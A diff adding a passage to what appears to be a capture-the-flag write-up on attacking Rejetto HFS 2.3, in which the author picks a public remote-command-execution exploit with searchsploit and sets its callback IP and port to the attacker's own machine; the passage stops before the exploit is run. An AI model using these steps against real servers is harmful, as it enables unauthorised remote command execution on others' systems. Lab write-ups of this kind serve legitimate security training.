@@ -180,4 +180,26 @@ INFO: Response content length is not known
 ```
 What's this! Content length not known?!
 
-## 3. 
+## 3. Attacking HFS 2.3
+The first Searchsploit result `Buffer Overflow (PoC)` seems to be about DoS. Moving on, the second result `Arbitrary File Upload` wasn't useful. Thirdly, the third result `Remote Command Execution (1)` didn't have detailed documentation, and I do not know how to exploit this. Finally, the forth result `Remote Command Execution (2)` looks promising so we're going to attempt to use this python code.
+
+Let's copy the file to our workspace and work from there.
+```
+hippoeug@kali:~$ searchsploit -m 39161.py                                                                                                                             
+  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
+      URL: https://www.exploit-db.com/exploits/39161
+     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /home/hippoeug/39161.py
+```
+
+Let's edit the file and execute it.
+```
+hippoeug@kali:~$ nano 39161.py
+```
+We must change the local listening IP address (our kali) and the port.
+```
+ip_addr = "10.10.x.x" #local IP address
+local_port = "80" # Local Port number
+```
